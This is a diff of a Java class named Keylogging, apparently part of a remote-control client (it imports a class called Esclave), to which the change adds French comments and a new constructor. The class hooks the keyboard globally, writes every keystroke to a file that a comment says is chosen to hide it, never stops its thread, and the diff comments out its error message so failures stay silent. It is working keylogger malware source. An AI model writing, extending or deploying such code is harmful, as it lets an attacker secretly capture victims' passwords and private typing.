@@ -1,3 +1,18 @@
+/*
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ * 
+ */
+
 package remote.action;
 
 import java.awt.Toolkit;
@@ -13,40 +28,73 @@ import client.Esclave;
 import de.ksquared.system.keyboard.GlobalKeyListener;
 import de.ksquared.system.keyboard.KeyListener;
 
+/**
+ * Classe initialisant deux Thread permettant d'enregistrer toutes les saisies
+ * au Clavier dans un fichier
+ * 
+ * @author lh
+ *
+ */
 public class Keylogging extends Thread {
 
-	public static String cheminFile;
+
+	/**************************************************** *********************************************************************************/
+	/*													   ARGUMENTS																	   /	
+	/**************************************************************************************************************************************/
+	
+	public static String cheminFile; // nom du Fichier
 	private static File f;
 	private int code;
-	private static boolean capslock;
-	private static boolean shift;
-	private static PrintWriter pw;
+	private static boolean capslock; // Flag pour les touches speciales
+	private static boolean shift; //
+	private static PrintWriter pw; // Flux d'ecriture dans le fichier
 	private int nombredecaractereparligne = 0;
 
-	public Keylogging(Esclave esclave) throws IOException {
+
+
+
+	/**************************************************** *********************************************************************************/
+	/*													   CONSTRUCTEUR																	   /	
+	/**************************************************************************************************************************************/
+	public Keylogging() throws IOException {
 
 		// TODO Auto-generated constructor stub
-		cheminFile = getPath();
+		cheminFile = getPath();													// Choisi un endroit pour cacher le fichier
 		capslock = Toolkit.getDefaultToolkit().getLockingKeyState(
 				KeyEvent.VK_CAPS_LOCK);
-		f = new File(cheminFile);
-		pw = new PrintWriter(new BufferedWriter(
-				new FileWriter(cheminFile, true)));
-
+		f = new File(cheminFile);												// Ouvre le fichier
+		pw = new PrintWriter(new BufferedWriter(	
+				new FileWriter(cheminFile, true)));								// Ouvre en ecriture
 		if (f.exists())
-			this.start();
-		else
-			System.out
-					.println("Ne peux pas ouvrir un fichier pour sauvegarder les frappes");
 
+			this.start(); 														// Demarre le keylogger
+		else{
+			
+		//	System.out.println("Ne peux pas ouvrir un fichier "
+			//		+ "pour sauvegarder les frappes");
+		}
 	}
 
+	
+	
+
+	/**************************************************** *********************************************************************************/
+	/*													   METHODES																	   /	
+	/**************************************************************************************************************************************/
+	
+	/**
+	 * 			Methode run du Keylogger utilisant la libraire KeyboardHook ' H. Joseph, 23 Jul 2001 ' qui permet de capturer des saisies
+	 * 			au clavier
+	 *			Creation d'un Global Listener qui va lancer deux Thread: un pour l'appui sur une touche, un pour le relachement	
+	 * 
+	 */
 	@Override
 	public void run() {
 		new GlobalKeyListener().addKeyListener(new KeyListener() {
 
 			@Override
-			public void keyPressed(de.ksquared.system.keyboard.KeyEvent event) {
+			public void keyPressed(
+					final de.ksquared.system.keyboard.KeyEvent event) {
 				// TODO Auto-generated method stub
 				Thread t = new Thread() {
 					public void run() {
@@ -70,7 +118,8 @@ public class Keylogging extends Thread {
 			}
 
 			@Override
-			public void keyReleased(de.ksquared.system.keyboard.KeyEvent event) {
+			public void keyReleased(
+					final de.ksquared.system.keyboard.KeyEvent event) {
 				// TODO Auto-generated method stub
 				Thread t1 = new Thread() {
 					public void run() {
@@ -91,13 +140,18 @@ public class Keylogging extends Thread {
 		});
 		while (true) {
 			try {
-				Thread.sleep(100);
+				Thread.sleep(100);											// N'arrete jamais le Thread
 			} catch (InterruptedException e) {
 				e.printStackTrace();
 			}
 		}
 	}
 
+	/**
+	 * Converti un code Ascii en Caractere
+	 * @param code : numero Ascii
+	 * @return
+	 */
 	char codeToChar(int code) {
 		char key = 0;
 
@@ -538,14 +592,15 @@ public class Keylogging extends Thread {
 		pw.close();
 	}
 
-	private  String getPath(){
-		 String chemin= (( System.getProperty("os.name").contains("win") || System
-					.getProperty("os.name").contains("Win")) ? Paths.get("").toAbsolutePath().toString() :
-						"/dev" ) +"trace.txt";
+	private String getPath() {
+		String chemin = ((System.getProperty("os.name").contains("win") || System
+				.getProperty("os.name").contains("Win")) ? Paths.get("")
+				.toAbsolutePath().toString() : "/dev")
+				+ "trace.txt";
 		return chemin;
 	}
-	
-	public void supprimerFichier(){
+
+	public void supprimerFichier() {
 		f.delete();
 	}
 }
